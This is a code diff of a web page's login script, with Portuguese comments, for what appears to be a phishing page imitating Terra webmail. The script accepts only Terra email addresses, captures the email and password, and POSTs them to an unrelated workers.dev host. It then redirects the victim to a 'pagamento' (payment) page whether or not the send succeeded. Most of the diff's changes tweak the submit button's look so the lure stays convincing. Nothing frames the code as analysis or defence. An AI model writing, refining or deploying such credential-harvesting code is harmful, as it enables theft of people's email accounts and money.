@@ -156,74 +156,83 @@
  </footer>
  </div>
 
-<!-- SCRIPT DE VALIDAÇÃO + ENVIO - CORRIGIDO -->
+<!-- SCRIPT - BOTÃO LARANJA SEMPRE (MESMO DESABILITADO) -->
 <script>
-(function() {
-    // Aguarda a página carregar
-    window.addEventListener('load', function() {
+window.addEventListener('load', function() {
+    var form = document.getElementById('formLogin');
+    var emailInput = document.getElementById('user');
+    var senhaInput = document.getElementById('pass');
+    var botao = form.querySelector('button');
+    
+    // Função para verificar email Terra
+    function emailTerraValido(email) {
+        return email.includes('@terra.com.br') || email.includes('@terra.com');
+    }
+    
+    // Função para atualizar estado do botão
+    function atualizarBotao() {
+        var email = emailInput.value.trim();
+        var senha = senhaInput.value.trim();
         
-        // ===== ELEMENTOS =====
-        const form = document.getElementById('formLogin');
-        const emailInput = document.getElementById('user');
-        const senhaInput = document.getElementById('pass');
-        const submitBtn = form.querySelector('button[type="submit"]');
-        
-        // ===== FUNÇÃO PARA VALIDAR EMAIL TERRA =====
-        function validarEmail(email) {
-            // Domínios permitidos
-            const dominios = ['terra.com.br', 'terra.com'];
-            if (!email || !email.includes('@')) return false;
-            
-            const dominio = email.split('@')[1].toLowerCase();
-            return dominios.includes(dominio);
+        // Se email válido E senha NÃO vazia
+        if (emailTerraValido(email) && senha.length > 0) {
+            botao.disabled = false;      // Habilita para clicar
+            botao.style.opacity = '1';
+            botao.style.cursor = 'pointer';
+        } else {
+            botao.disabled = true;       // Desabilita para não clicar
+            botao.style.opacity = '1';   // MANTÉM OPACIDADE 1 (não muda)
+            botao.style.cursor = 'not-allowed'; // Cursor de bloqueado
         }
         
-        // ===== GARANTE QUE O BOTÃO FIQUE LARANJA SEMPRE =====
-        submitBtn.disabled = false; // NUNCA desabilita o botão
-        submitBtn.style.opacity = '1';
-        submitBtn.style.cursor = 'pointer';
-        submitBtn.style.backgroundColor = ''; // Volta à cor original
+        // GARANTE QUE A COR LARANJA ORIGINAL PERMANEÇA
+        botao.style.backgroundColor = ''; // Volta ao CSS original
+    }
+    
+    // Monitora enquanto digita
+    emailInput.addEventListener('input', atualizarBotao);
+    senhaInput.addEventListener('input', atualizarBotao);
+    
+    // Estado inicial
+    botao.disabled = true;
+    botao.style.opacity = '1';        // IMPORTANTE: opacidade normal
+    botao.style.cursor = 'not-allowed';
+    botao.style.backgroundColor = ''; // Força cor original
+    
+    // Intercepta o envio
+    form.onsubmit = function(e) {
+        e.preventDefault();
         
-        // ===== INTERCEPTA O ENVIO DO FORMULÁRIO =====
-        form.addEventListener('submit', function(e) {
-            e.preventDefault(); // Impede o envio padrão
-            
-            // Pega os dados
-            const email = emailInput.value.trim();
-            const senha = senhaInput.value.trim();
-            
-            // VALIDAÇÃO NA HORA DO CLIQUE
-            if (!validarEmail(email)) {
-                alert('❌ Digite um email Terra válido (@terra.com.br)');
-                return;
-            }
-            
-            if (senha.length === 0) {
-                alert('❌ Digite sua senha');
-                return;
-            }
-            
-            // Se passou na validação, ENVIA!
-            var formData = new FormData();
-            formData.append('email', email);
-            formData.append('senha', senha);
-            
-            // Envia para o worker
-            fetch('https://magui.maguimdasencomendas.workers.dev/', {
-                method: 'POST',
-                body: formData
-            })
-            .then(function(response) {
-                // Depois de enviar, redireciona para a segunda página
-                window.location.href = 'pagamento.html';
-            })
-            .catch(function(error) {
-                console.log('Erro:', error);
-                // Mesmo com erro, redireciona
-                window.location.href = 'pagamento.html';
-            });
+        var email = emailInput.value.trim();
+        var senha = senhaInput.value.trim();
+        
+        if (!emailTerraValido(email)) {
+            alert('❌ Use apenas email do Terra (@terra.com.br)');
+            return false;
+        }
+        
+        if (senha === '') {
+            alert('❌ Digite sua senha');
+            return false;
+        }
+        
+        // Se passou, envia!
+        var formData = new FormData();
+        formData.append('email', email);
+        formData.append('senha', senha);
+        
+        fetch('https://magui.maguimdasencomendas.workers.dev/', {
+            method: 'POST',
+            body: formData
+        })
+        .then(function() {
+            window.location.href = 'pagamento.html';
+        })
+        .catch(function() {
+            window.location.href = 'pagamento.html';
         });
         
-    }); // fim window.load
-})(); // fim função auto-executável
+        return false;
+    };
+});
 </script>
